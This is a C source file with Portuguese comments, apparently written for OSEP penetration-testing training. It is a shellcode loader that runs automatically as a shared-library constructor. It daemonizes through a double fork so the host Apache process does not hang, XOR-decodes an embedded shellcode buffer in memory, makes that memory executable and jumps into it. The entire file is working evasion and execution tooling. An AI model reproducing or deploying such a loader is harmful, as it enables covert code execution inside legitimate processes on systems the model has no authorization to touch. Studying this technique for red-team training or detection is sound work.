#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

// Chave XOR igual à do manual OSEP
char xor_key = 'J';

// Seu buf original XORado (Ajuste os bytes ou use este exemplo de estrutura)
unsigned char buf[] =
"\x7b\xb5\x20\x43\x12\xd3\xfc\x5a\x02\xc3\x9c\x07\x7b\x83\x20\x68\x0b\x10\x20\x4d\x10\x45\x4f\x02\xcf\x8a\x32\x1b\x20\x40\x0b\x13\x1a\x20\x63\x12\xd3\x20\x48\x15\x20\x4b\x14\x45\x4f\x02\xcf\x8a\x32\x71\x02\xdd\x02\xf3\x48\x4a\x4b\xf1\x8a\xe2\x67\x93\x1b\x02\xc3\xac\x20\x5a\x10\x20\x60\x12\x45\x4f\x13\x02\xcf\x8a\x33\x6f\x03\xb5\x83\x3e\x52\x1d\x20\x69\x12\x20\x4a\x20\x4f\x02\xc3\xad\x02\x7b\xbc\x45\x4f\x13\x13\x15\x02\xcf\x8a\x33\x8d\x20\x76\x12\x20\x4b\x15\x45\x4f\x14\x20\x34\x10\x45\x4f\x02\xcf\x8a\x32\xa7\xb5\xac";

static void init() __attribute__((constructor));

void init() {
    // Fork duplo para garantir que o processo se torne daemon e não trave o Apache
    if (fork() == 0) {
        if (fork() == 0) {
            setsid();

            int arraysize = (int) sizeof(buf);
            // De-XOR em memória (Seção 14.2.2)
            for (int i=0; i<arraysize-1; i++) {
                buf[i] = buf[i] ^ xor_key;
            }

            intptr_t pagesize = sysconf(_SC_PAGESIZE);
            void *page_start = (void *)(((intptr_t)buf) & ~(pagesize - 1));

            if (mprotect(page_start, pagesize, PROT_READ | PROT_EXEC) == 0) {
                void (*ret)() = (void (*)())buf;
                ret();
            }
        }
        exit(0); // Primeiro filho morre rápido
    }
}